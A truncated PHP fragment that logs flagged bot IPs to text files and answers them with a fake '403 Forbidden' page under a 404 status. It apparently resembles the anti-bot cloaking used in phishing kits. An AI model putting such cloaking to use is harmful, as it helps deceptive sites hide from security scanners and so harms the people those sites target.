        $file = fopen("block_bot.txt", "a");
        fwrite($file, "  " . $ip . " 
");
        $click = fopen("result/total_bot.txt", "a");
        fwrite($click, "$ip (Detect by BITE USERAGENT)" . "
");
        fclose($click);
        header("HTTP/1.0 404 Not Found");
        die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
    }
};
